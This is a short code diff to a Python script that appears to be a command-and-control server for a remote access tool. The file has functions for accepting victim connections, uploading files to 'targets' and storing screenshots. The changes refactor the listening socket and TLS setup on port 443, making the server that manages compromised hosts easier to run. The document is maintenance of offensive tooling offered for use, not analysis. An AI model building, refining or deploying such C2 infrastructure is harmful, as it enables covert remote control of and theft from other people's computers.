@@ -4,7 +4,6 @@ import socket
 import ssl
 import sys
 import threading
-import time
 from colour import banner, Colour
 
 SCREENSHOT_DIR = 'images/screenshots'
@@ -15,6 +14,7 @@ HEADER_SIZE = 16
 
 CERT_FILE = 'cert.pem'
 KEY_FILE = 'key.pem'
+LISTEN_PORT = 443
 
 def send_json(target, data):
     try:
@@ -61,9 +61,9 @@ def accept_connections(sock, context, targets, ips):
 def initialise_socket():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sock.bind(('0.0.0.0', 443))
+    sock.bind(('0.0.0.0', LISTEN_PORT))
     sock.listen(5)
-    print("[INFO] Socket initialized")
+    print(f"[INFO] Listening on 0.0.0.0:{LISTEN_PORT}")
     return sock
 
 def upload_file(target, filename):
@@ -115,7 +115,7 @@ def run_c2():
 
     sock = initialise_socket()
 
-    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
     context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
 
     threading.Thread(target=accept_connections, args=(sock, context, targets, ips), daemon=True).start()
